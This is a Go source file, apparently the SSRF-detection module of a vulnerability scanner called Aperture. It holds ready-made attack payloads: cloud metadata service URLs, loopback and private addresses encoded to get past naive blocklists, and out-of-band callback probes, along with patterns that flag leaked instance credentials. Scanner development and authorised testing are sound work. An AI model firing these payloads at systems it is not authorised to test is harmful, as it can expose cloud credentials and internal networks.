package ssrf

import (
	"context"
	"fmt"
	"github.com/Indigo6415/Aperture/internal/fingerprint"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/Indigo6415/Aperture/internal/collaborator"
)

// ssrfParams covers parameter-naming conventions for the class of feature
// that actually performs a server-side fetch of an operator-supplied URL:
// webhooks, "import/fetch from URL", avatar/image-from-URL, URL-preview
// generators, and the like -- deliberately narrower than
// openredirect.commonRedirectParams, which is about *navigation* targets
// rather than server-side fetches.
var ssrfParams = []string{
	"url", "uri", "webhook", "webhook_url", "callback", "callback_url", "avatar_url", "image_url", "img_url",
	"src", "feed_url", "fetch_url", "import_url", "proxy_url", "target_url", "source_url", "file_url",
	"document_url", "link", "endpoint", "host", "path", "site",
}

type moduleMeta struct{ id, name, severity string }

var cloudMetadataModule = moduleMeta{id: "cloud-metadata", name: "Cloud metadata service reachable", severity: "critical"}
var internalNetworkModule = moduleMeta{id: "internal-network", name: "Internal/loopback network reachable", severity: "high"}
var oobCallbackModule = moduleMeta{id: "oob-callback", name: "Blind SSRF (out-of-band callback)", severity: "critical"}

// blackholeURL is a non-routable address (RFC 5737 TEST-NET-1, reserved for
// documentation -- guaranteed to never correspond to a real, reachable
// host) used as the "the server attempted a fetch and it went nowhere"
// control every internal-network payload is compared against.
const blackholeURL = "http://192.0.2.1/"

// cloudMetadataPayloads covers every major cloud provider's metadata
// endpoint -- see the package doc comment for why this is SSRF's single
// highest-value target.
var cloudMetadataPayloads = []struct{ provider, url string }{
	{"AWS", "http://169.254.169.254/latest/meta-data/"},
	{"GCP", "http://169.254.169.254/computeMetadata/v1/?recursive=true"},
	{"Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
	{"DigitalOcean", "http://169.254.169.254/metadata/v1/"},
	{"Alibaba Cloud", "http://100.100.100.200/latest/meta-data/"},
}

// cloudMetadataSignatureRe matches content that could only plausibly come
// from having actually reached a cloud metadata service -- including each
// provider's own "you're missing the required header" rejection body
// (GCP/Azure both require a header no application-level SSRF payload can
// add, but even that rejection text confirms the metadata IP was reached).
//
// Deliberately excludes "computemetadata": that string is a literal
// substring of the GCP payload's own URL (cloudMetadataPayloads' "GCP"
// entry), so any page that merely echoes the submitted URL back (an
// "invalid URL: ..." error, a re-rendered form field) matches it without
// the server ever having fetched anything -- a false positive from
// reflection, not from a signature any real metadata-service response or
// rejection would contain. "metadata-flavor" (GCP's actual missing-header
// rejection body) still catches a real GCP hit.
var cloudMetadataSignatureRe = regexp.MustCompile(`(?i)(ami-id|instance-id|iam/security-credentials|accesskeyid|placement/availability-zone|metadata-flavor|"project-id"|"compute"\s*:|azenvironment|subscriptionid|droplet_id|"region"\s*:\s*"[a-z0-9-]+"\s*,\s*"droplet)`)

// internalIPPayloads mixes plain loopback/private addresses with several
// alternate encodings that bypass a naive string-based blocklist (one that
// checks the raw parameter value for "127.0.0.1" or "localhost" rather than
// resolving and checking the actual destination IP) -- see each entry's
// description.
var internalIPPayloads = []struct{ description, url string }{
	{"loopback", "http://127.0.0.1/"},
	{"loopback hostname", "http://localhost/"},
	{"unspecified address", "http://0.0.0.0/"},
	{"IPv6 loopback", "http://[::1]/"},
	{"decimal-encoded loopback (bypasses a literal \"127.0.0.1\" string filter)", "http://2130706433/"},
	{"hex-encoded loopback (bypasses a literal-string filter)", "http://0x7f000001/"},
	{"shorthand loopback (bypasses a literal-string filter)", "http://127.1/"},
	{"public-DNS-resolved loopback (bypasses a hostname-equality filter that never resolves the value)", "http://127.0.0.1.nip.io/"},
	{"private range (RFC 1918)", "http://10.0.0.1/"},
	{"private range (RFC 1918)", "http://192.168.0.1/"},
}

// runCloudMetadataModule fires every (param, cloud-metadata-payload) pair
// concurrently and flags any response whose body matches
// cloudMetadataSignatureRe -- signature-only (no anomaly fallback), kept
// deliberately high-precision since this is the critical-severity module.
func runCloudMetadataModule(ctx context.Context, deps runDeps) []Finding {
	client := newClient()
	return runParamChecks(deps, cloudMetadataModule, func(param string) []Finding {
		var mu sync.Mutex
		var out []Finding
		var wg sync.WaitGroup
		for _, payload := range cloudMetadataPayloads {
			wg.Add(1)
			go func(payload struct{ provider, url string }) {
				defer wg.Done()
				res := fetchParamThrottled(ctx, deps.sem, client, deps.target, deps.method, param, payload.url, deps.req.Headers)
				if res.Err != nil || !cloudMetadataSignatureRe.MatchString(res.Body) {
					return
				}
				match := cloudMetadataSignatureRe.FindString(res.Body)
				mu.Lock()
				out = append(out, Finding{
					Label:      fmt.Sprintf("Parameter %q reaches the %s metadata service", param, payload.provider),
					Detail:     fmt.Sprintf("Set %s=%s and the response body contains content matching known %s metadata-service output -- the server fetched this URL itself. If this reflects the full response, check for exposed instance credentials (IAM role keys, a service-account token, ...).", param, payload.url, payload.provider),
					Evidence:   truncateEvidence(match),
					Method:     "GET",
					StatusCode: res.StatusCode,
					Request:    &res.Request,
				})
				mu.Unlock()
			}(payload)
		}
		wg.Wait()
		return out
	})
}

// controlURLs are the negative controls for the internal-network module: three
// non-routable addresses. The first is the original blackhole; the other two
// come from TEST-NET ranges (RFC 5737), which are reserved for documentation and
// are never routed. A payload has to differ from all three to count, so one
// odd control response cannot make every payload look anomalous.
var controlURLs = []string{blackholeURL, "http://198.51.100.1/", "http://203.0.113.1/"}

// runInternalNetworkModule fires each control URL at every parameter, then fires
// each internal-address payload and reports the ones that answer differently
// from all controls. A report then has to reproduce on a second send, which
// drops one-off transient responses. Each parameter has its own controls so a
// parameter's behavior is only ever judged against itself.
func runInternalNetworkModule(ctx context.Context, deps runDeps) []Finding {
	client := newClient()
	return runParamChecks(deps, internalNetworkModule, func(param string) []Finding {
		// This parameter's own controls come first: every payload below is
		// judged only against them, never against another parameter's.
		paramControls := make([]*ssrfResult, len(controlURLs))
		var wg sync.WaitGroup
		for i, cu := range controlURLs {
			wg.Add(1)
			go func(i int, cu string) {
				defer wg.Done()
				paramControls[i] = fetchParamThrottled(ctx, deps.sem, client, deps.target, deps.method, param, cu, deps.req.Headers)
			}(i, cu)
		}
		wg.Wait()

		var mu sync.Mutex
		var out []Finding
		for _, payload := range internalIPPayloads {
			wg.Add(1)
			go func(payload struct{ description, url string }) {
				defer wg.Done()
				res := fetchParamThrottled(ctx, deps.sem, client, deps.target, deps.method, param, payload.url, deps.req.Headers)
				if res.Err != nil {
					return
				}
				reason, anomalous := differsFromControls(res, paramControls)
				if !anomalous {
					return
				}
				// Reproduce before reporting: a second identical send must show
				// the same difference, or the first response was transient.
				again := fetchParamThrottled(ctx, deps.sem, client, deps.target, deps.method, param, payload.url, deps.req.Headers)
				if _, repeated := differsFromControls(again, paramControls); !repeated {
					return
				}
				mu.Lock()
				out = append(out, Finding{
					Label:      fmt.Sprintf("Parameter %q possibly reaches an internal address (%s)", param, payload.description),
					Detail:     fmt.Sprintf("Set %s=%s and the response %s compared to every non-routable control, and the difference reproduced on a second send. That suggests the server actually connected somewhere, rather than failing as it does for addresses it can never reach. Not conclusive on its own; verify manually or via the out-of-band module's confirmation.", param, payload.url, reason),
					Evidence:   fmt.Sprintf("payload: %d/%db in %v", res.StatusCode, res.ContentLength, res.Latency.Round(time.Millisecond)),
					Method:     "GET",
					StatusCode: res.StatusCode,
					Request:    &res.Request,
					Confidence: ConfidenceLikely,
				})
				mu.Unlock()
			}(payload)
		}
		wg.Wait()
		return out
	})
}

// differsFromControls reports whether res differs from every control. It
// returns the first control's reason, so the finding can say what changed.
func differsFromControls(res *ssrfResult, controls []*ssrfResult) (string, bool) {
	if len(controls) == 0 {
		return "", false
	}
	var first string
	for i, c := range controls {
		reason, differs := differsFromControl(res, c)
		if !differs {
			return "", false
		}
		if i == 0 {
			first = reason
		}
	}
	return first, true
}

// differsFromControl reports whether res looks like it landed somewhere the
// control didn't. A different status code is a difference. For a matching
// status, the bodies are compared by content (fingerprint.Similar), not by raw
// length, because dynamic pages change length on every request.
func differsFromControl(res, control *ssrfResult) (reason string, anomalous bool) {
	if control == nil || control.Err != nil {
		// The control errored or timed out, which is the common case for a
		// non-routable address. A payload that got a clean response at all is
		// already the anomaly.
		if res.StatusCode != 0 {
			return "succeeded where the control errored out entirely", true
		}
		return "", false
	}
	if res.StatusCode != control.StatusCode {
		return fmt.Sprintf("returned HTTP %d vs the control's %d", res.StatusCode, control.StatusCode), true
	}
	resObs := fingerprint.Observe(res.StatusCode, "", []byte(res.Body))
	ctlObs := fingerprint.Observe(control.StatusCode, "", []byte(control.Body))
	if !fingerprint.Similar(resObs, ctlObs) {
		return "returned a body whose content differs from the control's", true
	}
	return "", false
}

func controlStatus(c *ssrfResult) int {
	if c == nil {
		return 0
	}
	return c.StatusCode
}
func controlLength(c *ssrfResult) int {
	if c == nil {
		return 0
	}
	return c.ContentLength
}
func controlLatency(c *ssrfResult) time.Duration {
	if c == nil {
		return 0
	}
	return c.Latency.Round(time.Millisecond)
}

// runOOBCallbackModule points every candidate parameter at an OOB
// callback address, fires every probe concurrently, waits for callbacks to settle (see collaborator.WaitForCallbacks)
// for an asynchronous fetch to land, then polls for a hit -- any hit
// confirms that parameter actually made the server perform the fetch,
// independent of anything visible in the HTTP response this scanner itself
// received. This is the only module here that can confirm a fully blind
// SSRF.
//
// Without oob.SharedToken, this mints one throwaway collaborator token per
// parameter (today's original behavior, unchanged): tokens themselves tell
// parameters apart, so no further disambiguation is needed. With
// oob.SharedToken (an operator-picked, long-lived server from their own
// Callback picker), every parameter instead shares that one token and is
// told apart by an embedded Identifier (see collaborator.Interaction) --
// letting a human watch the single listener in the Collaborator tab across
// an entire scan, and across other scanners/tests reusing the same server.
func runOOBCallbackModule(ctx context.Context, deps runDeps, oob OOBConfig) []Finding {
	if oob.SharedToken != "" {
		return runOOBCallbackModuleShared(ctx, deps, oob)
	}

	if oob.Registry == nil || oob.CallbackBaseURL == "" {
		return []Finding{{
			Label:  "Out-of-band callback listener not configured",
			Detail: "This module confirms a blind SSRF (one with no visible signal in the endpoint's own response) by pointing payloads at Aperture's own collaborator listener and checking whether the server called back. Configure a collaborator domain/answer IP in Settings to enable it.",
		}}
	}

	client := newClient()
	type tokenInfo struct {
		param, token string
		urls         []string
	}
	infos := make([]tokenInfo, len(deps.params))
	for i, p := range deps.params {
		token := oob.Registry.NewToken()
		urls := []string{strings.TrimRight(oob.CallbackBaseURL, "/") + "/collab/" + token + "/"}
		if oob.DNSDomain != "" {
			urls = append(urls, "http://"+token+"."+oob.DNSDomain+"/")
		}
		infos[i] = tokenInfo{param: p, token: token, urls: urls}
	}

	// Every parameter's check is in flight from here until the callback wait
	// below settles -- they all share that one wait, so they all read as
	// testing together and finish together.
	for _, info := range infos {
		deps.rep.Start(deps.check(oobCallbackModule, info.param).ID)
	}

	var wg sync.WaitGroup
	for _, info := range infos {
		for _, u := range info.urls {
			wg.Add(1)
			go func(param, u string) {
				defer wg.Done()
				fetchParamThrottled(ctx, deps.sem, client, deps.target, deps.method, param, u, deps.req.Headers)
			}(info.param, u)
		}
	}
	wg.Wait()

	tokens := make([]string, 0, len(infos))
	for _, info := range infos {
		tokens = append(tokens, info.token)
	}
	deps.rep.Phase("Waiting for out-of-band callbacks")
	collaborator.WaitForRegistry(ctx, oob.Registry, tokens, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)

	var out []Finding
	for _, info := range infos {
		id := deps.check(oobCallbackModule, info.param).ID
		hits := oob.Registry.Poll(info.token)
		if len(hits) == 0 {
			deps.rep.Done(id, 0, nil)
			continue
		}
		h := hits[0]
		f := ssrfOOBFinding(info.param, hits, h)
		f.Confidence = ConfidenceConfirmed
		out = append(out, f)
		deps.rep.Done(id, 1, nil)
	}
	return out
}

// ssrfIdentifierFor derives a stable, DNS-label-and-URL-path-safe identifier
// for param -- used only on the oob.SharedToken path, where many parameters
// share one token and need to stay distinguishable in both an HTTP path
// segment and a DNS label.
func ssrfIdentifierFor(param string) string {
	var b strings.Builder
	b.WriteString("ssrf-")
	for _, r := range param {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9':
			b.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			b.WriteRune(r + ('a' - 'A'))
		default:
			b.WriteByte('-')
		}
	}
	return b.String()
}

// runOOBCallbackModuleShared is runOOBCallbackModule's oob.SharedToken path
// -- see that function's doc comment.
func runOOBCallbackModuleShared(ctx context.Context, deps runDeps, oob OOBConfig) []Finding {
	client := newClient()
	type paramInfo struct {
		param, identifier string
		urls              []string
	}
	infos := make([]paramInfo, len(deps.params))
	for i, p := range deps.params {
		identifier := ssrfIdentifierFor(p)
		var urls []string
		if oob.SharedProvider == "webhooksite" {
			urls = []string{collaborator.WebhookSiteCallbackURL(oob.SharedToken) + "/" + identifier + "/"}
		} else {
			urls = []string{strings.TrimRight(oob.CallbackBaseURL, "/") + "/collab/" + oob.SharedToken + "/" + identifier + "/"}
			if oob.DNSDomain != "" {
				urls = append(urls, "http://"+identifier+"."+oob.SharedToken+"."+oob.DNSDomain+"/")
			}
		}
		infos[i] = paramInfo{param: p, identifier: identifier, urls: urls}
	}

	// Same shared-wait accounting as the per-token path above: every check
	// is in flight until the one callback wait settles.
	for _, info := range infos {
		deps.rep.Start(deps.check(oobCallbackModule, info.param).ID)
	}

	var wg sync.WaitGroup
	for _, info := range infos {
		for _, u := range info.urls {
			wg.Add(1)
			go func(param, u string) {
				defer wg.Done()
				fetchParamThrottled(ctx, deps.sem, client, deps.target, deps.method, param, u, deps.req.Headers)
			}(info.param, u)
		}
	}
	wg.Wait()

	deps.rep.Phase("Waiting for out-of-band callbacks")
	var hits []collaborator.Interaction
	var err error
	if oob.SharedProvider == "webhooksite" {
		hits, err = collaborator.WaitForCallbacks(ctx, func(c context.Context) ([]collaborator.Interaction, error) {
			return collaborator.PollWebhookSite(c, oob.SharedToken)
		}, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)
	} else if oob.Registry != nil {
		collaborator.WaitForRegistry(ctx, oob.Registry, []string{oob.SharedToken}, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)
		hits = oob.Registry.Poll(oob.SharedToken)
	}
	// A failed poll discards whatever it returned, same as before -- every
	// parameter then reads as "no callback", not as a partial result.
	if err != nil {
		hits = nil
	}

	// Group every polled hit by which test's Identifier it carries, so a
	// shared token's interleaved traffic can still be attributed back to
	// the one parameter that caused it.
	byIdentifier := map[string][]collaborator.Interaction{}
	for _, h := range hits {
		byIdentifier[h.Identifier] = append(byIdentifier[h.Identifier], h)
	}

	var out []Finding
	for _, info := range infos {
		id := deps.check(oobCallbackModule, info.param).ID
		matched := byIdentifier[info.identifier]
		if len(matched) == 0 {
			deps.rep.Done(id, 0, nil)
			continue
		}
		f := ssrfOOBFinding(info.param, matched, matched[0])
		f.Confidence = ConfidenceConfirmed
		out = append(out, f)
		deps.rep.Done(id, 1, nil)
	}
	return out
}

// ssrfOOBFinding builds the Finding every confirmed-hit path above returns,
// given param's full hit list and its first (earliest) hit h.
func ssrfOOBFinding(param string, hits []collaborator.Interaction, h collaborator.Interaction) Finding {
	return Finding{
		Label: fmt.Sprintf("Parameter %q triggered a blind out-of-band callback", param),
		Detail: fmt.Sprintf(
			"Pointed %s at an Aperture-controlled callback address and received %d inbound %s interaction(s) back, the first from %s -- confirms the server itself fetched the attacker-supplied URL, regardless of what (if anything) showed up in its HTTP response to this scan.",
			param, len(hits), h.Protocol, h.RemoteAddr,
		),
		Evidence: fmt.Sprintf("%s callback from %s at %s", h.Protocol, h.RemoteAddr, h.Timestamp.Format(time.RFC3339)),
		Method:   "GET",
	}
}

func truncateEvidence(s string) string {
	const max = 300
	if len(s) <= max {
		return s
	}
	return s[:max] + "…"
}
